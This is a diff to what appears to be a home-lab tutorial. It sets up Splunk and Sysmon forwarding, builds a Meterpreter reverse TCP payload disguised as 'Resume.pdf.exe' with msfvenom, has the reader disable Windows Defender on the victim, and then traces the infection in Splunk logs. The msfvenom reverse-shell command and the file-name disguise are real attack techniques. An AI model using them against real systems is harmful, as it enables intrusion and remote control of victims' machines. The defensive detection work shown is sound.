@@ -193,7 +193,30 @@ Create a username and password, then click **Install**.
 Once installed, open your browser and navigate to `http://localhost:8000`.  
 Splunk should now be running on your local machine.
 
-## 7. Establish a reverse TCP shell in the attacker machine:
+## 7. Install Splunk Universal Forwarder:
+
+In the victim machine, go to the [official website](https://www.splunk.com/en_us/download/universal-forwarder.html) of Splunk Universal Forwarder and download the version that matches your OS.
+
+Run the installer and during the setup:
+
+- Choose **"Forward data to another Splunk instance"**
+- Enter your **Splunk Server IP and receiving port** (default is 9997)
+- Choose **Local System Account** or preferably a custom admin account
+- After install, confirm the service `SplunkForwarder` is running
+
+After the installation, open the file `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf` and at the end, add this:
+
+```ini
+[WinEventLog://Microsoft-Windows-Sysmon/Operational]
+disabled = false
+renderXml = true
+index = endpoint
+```
+
+Or change `index = endpoint` to `index = main` for testing.
+After that, restart the forwarder.
+
+## 8. Establish a reverse TCP shell in the attacker machine:
 
 As a first step, open a terminal in the Kali machine and run `ifconfig` or `ip a` to find your IP address—make a note of it, as you’ll need it when building the malware.
 
@@ -221,7 +244,7 @@ In this example, I’ll use the following payload:
 Run this command:
 
 ```sh
-msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe` 
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
 ```
 
 This command generates a piece of malware using Meterpreter’s reverse TCP payload, which is configured to connect back to our attacker machine.  
@@ -256,7 +279,7 @@ Open a new terminal in the same directory where the malware file is located, and
 
 This allows the victim machine to access the attacker machine and download the malware from it.
 
-## 8. Execute the malware in the victim machine:
+## 9. Execute the malware in the victim machine:
 
 First, open the Windows 10 machine and go to the **Security Center**.  
 Under **Virus & threat protection**, click on **Manage settings**.  
@@ -298,7 +321,7 @@ net localgroup
 ipconfig
 ```
 
-## 9. Check telemetry with Splunk:
+## 10. Check telemetry with Splunk:
 
 Back on the Windows machine, we first need to make sure that Splunk is configured to ingest Sysmon logs.
 
@@ -332,6 +355,18 @@ You’ll see that a large amount of data has been ingested.
 Note that Splunk does not automatically parse Sysmon logs. To properly parse and structure the data, you’ll need to install an app called Splunk Add-on for Sysmon.
 
 ![](./assets/data-ingested.png)
+
+Now it's time to play with Splunk and analyze the data. For example, by searching `index=endpoint Resume.pdf.exe`, we will see **Sysmon** and **Windows Defender** logs side by side for the same incident. A basic forensic analysis shows that this is malware flagged as a **Trojan** by **Windows Defender**, detected on the **Local machine** with a **Severe** category.
+
+![](./assets/malware-log.png)
+
+Now let's analyze a **Sysmon Event ID 3**, which logs **network connections** initiated by processes.  
+Running this query: `index=endpoint source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 Image=*Resume.pdf.exe`, we get the following result:
+
+![](./assets/trojan-eventcode3.png)
+
+This log captures a **network connection** created by the Trojan. The malware is communicating over port `4444`, which is **not commonly used** for legitimate services. This is a technique used to bypass basic firewalls or monitoring systems that only watch standard ports. The destination IP is `192.168.20.11` (our attacker machine).  
+If this were real, the host should be isolated immediately to avoid lateral movement or exfiltration.
 
 ## Conclusion:
 
